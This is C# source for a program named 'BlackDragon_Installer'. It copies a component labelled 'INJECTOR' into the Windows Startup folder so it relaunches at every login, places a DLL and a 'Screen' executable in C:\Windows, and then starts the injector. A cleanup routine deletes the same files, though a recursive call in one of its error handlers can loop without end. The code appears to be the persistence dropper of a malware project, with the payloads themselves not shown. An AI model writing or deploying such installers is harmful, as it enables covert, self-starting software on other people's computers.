using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.Threading.Tasks;


namespace BlackDragon_Installer
{
    class Program
    {
        static public string startup_Path = String.Format("{0}\\", Environment.GetFolderPath(Environment.SpecialFolder.Startup));


        static void Main(string[] args)
        {


            RemoveAll();


            StartupCopy();
        }



        public static void StartupCopy()
        {

            

            ///                                                INJECTOR

            try
            {
                if (!File.Exists(startup_Path + "BLKDRG.exe"))
                {

                    File.Copy("BLKDRG-1.bin", String.Format("{0}\\{1}", startup_Path, "BLKDRG.exe"));
                }

            }
            catch (Exception e)
            {
                Console.WriteLine("Removing 1");
                RemoveAll();
                return;
            }
            ///                                                   DLL

            

            try
            {
                if (!File.Exists("C:\\Windows\\BLKDRG.dll"))
                {

                    File.Copy("BLKDRG.dll", "C:\\Windows\\BLKDRG.dll");
                }
            }
            catch (Exception e)
            {
                Console.WriteLine("Removing 2");
                RemoveAll();
                return;
            }
            ///                                                   Screen

            try
            {
                if (!File.Exists("C:\\Windows\\" + "BLKDRG-Screen.exe"))
                {

                    File.Copy("BLKDRG-2.bin", "C:\\Windows\\BLKDRG-Screen.exe");
                }
            }
            catch (Exception e)
            {
                Console.WriteLine("Removing 3");
                RemoveAll();
                return;
            }


            Console.WriteLine("DONE !");

            Process.Start(startup_Path + "BLKDRG.exe");


        }















        public static void RemoveAll()
        {
            try
            {
                if (File.Exists(String.Format("{0}\\{1}", Environment.GetFolderPath(Environment.SpecialFolder.Startup), "BLKDRG.exe")))

                    File.Delete(String.Format("{0}\\{1}", Environment.GetFolderPath(Environment.SpecialFolder.Startup), "BLKDRG.exe"));

            }
            catch (Exception e)
            {}

            try
            {
                if (File.Exists("C:\\Windows\\" + "BLKDRG-Screen.exe"))
                {

                    File.Delete("C:\\Windows\\BLKDRG-Screen.exe");
                    
                }
            }
            catch (Exception e)
            {}

            try
            {
                if (File.Exists("C:\\Windows\\BLKDRG.dll"))
                {

                    File.Delete("C:\\Windows\\BLKDRG.dll");
                }
            }
            catch (Exception e)
            {
                Console.WriteLine("Removing");
                RemoveAll();
                return;
            }



        }


    }
}
